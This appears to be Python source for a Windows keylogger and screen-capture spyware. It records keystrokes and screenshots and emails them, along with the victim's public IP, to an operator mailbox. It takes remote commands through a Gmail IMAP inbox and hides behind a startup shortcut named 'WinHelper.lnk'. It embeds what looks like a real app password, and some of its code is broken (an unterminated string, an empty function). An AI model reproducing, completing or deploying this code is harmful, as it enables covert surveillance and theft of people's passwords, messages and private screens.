import keyboard
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from pyautogui import screenshot as pagscreen
from pyautogui import keyDown, keyUp
import os
import winshell
import imaplib
import email
import threading
import subprocess

# Global variables
input_text = ""
ONLY_TEXT = True
ONLY_IMAGE = False
SLEEP = False
KILL = False
x = 0

def get_global_ip():
    # Function to get the global IP address and send it via email
    result = subprocess.run(['curl', 'https://ifconfig.co/'], capture_output=True, text=True)
    result = result.stdout

    sender = "bot_email@email.com"
    passw = "bot_password"
    receive = "my_email@mail.com

    message = MIMEMultipart()
    message.attach(MIMEText(result, 'plain'))

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(sender, passw)
    server.sendmail(sender, receive, message.as_string())

def auto_start():
    # Function to automatically start the program on Windows startup
    #is not OPEN SOURCE

def send_text_only():
    # Function to send text content via email
    global input_text
    sender = "bot_email@email.com"
    passw = "bot_password"
    receive = "my_email@mail.com"
    message = MIMEMultipart()
    message.attach(MIMEText(input_text, 'plain'))

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(sender, passw)
    server.sendmail(sender, receive, message.as_string())
    input_text = ""

def key_logger():
    # Function to log keystrokes
    global input_text
    while ONLY_TEXT:
        time.sleep(0.001)
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            if key == "space":
                input_text += " "
            elif not ONLY_TEXT:
                break
            elif key == "ctrl":
                input_text += " CTRL "
            elif key == "shift":
                input_text += " SHIFT "
            elif key == "alt":
                input_text += " ALT "
            else:
                input_text += key
        if keyboard.is_pressed("enter"):
            send_text_only()
            input_text = ""

def screen_logger():
    # Function to capture and send screenshots
    global x
    while True:
        global screenshot
        if x == 0:
            screenshot = pagscreen()
            screenshot.save('screenshot.png')
            time.sleep(0.2)
            send_image_only(screenshot)
            x = 25
        if not ONLY_IMAGE:
            break
        time.sleep(1)
        x -= 1

def send_image_only(screenshot):
    # Function to send image content via email
    sender = "bot_email@email.com"
    passw = "bot_password"
    receive = "my_email@email.com"

    message = MIMEMultipart()
    img_data = open('screenshot.png', 'rb').read()
    image = MIMEImage(img_data, 'png')
    message.attach(image)

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(sender, passw)
    server.sendmail(sender, receive, message.as_string())
    print("Sent")

def drop():
    # Function to remove the program's shortcut from Windows startup
    startup = winshell.startup()
    shortcut_path = os.path.join(startup, "WinHelper.lnk")

    if os.path.exists(shortcut_path):
        os.remove(shortcut_path)
        print("Shortcut successfully removed.")
    else:
        print("Shortcut does not exist, nothing to delete.")

def sleep_f():
    # Function to simulate sleep
    while True:
        time.sleep(5)
        if not SLEEP:
            break

def wait():
    # Function to wait for and process incoming emails
    global ONLY_IMAGE
    global ONLY_TEXT
    global SLEEP
    global KILL
    mail_server = "imap.gmail.com"
    mail_user = "bot_email@email.com"
    mail_password = "zouepyqdduulxadf"
    while True:
        time.sleep(10)
        mail = imaplib.IMAP4_SSL(mail_server)
        mail.login(mail_user, mail_password)
        print("Logged in")
        mail.select("inbox")
        print("Selected")

        result, data = mail.search(None, 'ALL')
        email_ids = data[0].split()
        for email_id in email_ids[-3:]:
            result, msg_data = mail.fetch(email_id, '(RFC822)')
            raw_email = msg_data[0][1]
            msg = email.message_from_bytes(raw_email)
            print(msg["Subject"])
            if msg["Subject"] == "TEXT_ONLY":
                ONLY_TEXT = True
                KILL = False
                SLEEP = False
                ONLY_IMAGE = False
                mail.store(email_id, '+FLAGS', '(\Deleted)')
                mail.expunge()
            elif msg["Subject"] == "IMAGE_ONLY":
                ONLY_TEXT = False
                KILL = False
                SLEEP = False
                ONLY_IMAGE = True
                keyDown('shift')
                time.sleep(0.1)
                keyUp('shift')
                mail.store(email_id, '+FLAGS', '(\Deleted)')
                mail.expunge()
                print("Email deleted")
            elif msg["Subject"] == "SLEEP":
                ONLY_TEXT = False
                KILL = False
                SLEEP = True
                ONLY_IMAGE = False
                mail.store(email_id, '+FLAGS', '(\Deleted)')
                mail.expunge()
            elif msg["Subject"] == "KILL":
                ONLY_TEXT = False
                KILL = True
                SLEEP = False
                ONLY_IMAGE = False
                mail.store(email_id, '+FLAGS', '(\Deleted)')
                mail.expunge()
            else:
                print("I am waiting")

        mail.logout()
        if KILL:
            print("WAIT is killed")
            keyDown('shift')
            time.sleep(0.3)
            keyUp('shift')
            break

def thread1():
    # Thread 1 function to handle different operations based on global flags
    global input_text
    global ONLY_IMAGE
    global ONLY_TEXT
    global SLEEP
    global KILL
    while True:
        time.sleep(0.1)
        if ONLY_IMAGE:
            screen_logger()
            print("IMAGE")
        elif ONLY_TEXT:
            print("TEXT ONLY")
            key_logger()
        elif SLEEP:
            sleep_f()
        elif KILL:
            drop()
            break

def thread2():
    # Thread 2 function to wait for and process incoming emails
    global ONLY_IMAGE
    global ONLY_TEXT
    global SLEEP
    global KILL
    wait()

# Program initialization
auto_start()
get_global_ip()

# Create and start threads
t1 = threading.Thread(target=thread1)
t2 = threading.Thread(target=thread2)
t1.start()
t2.start()
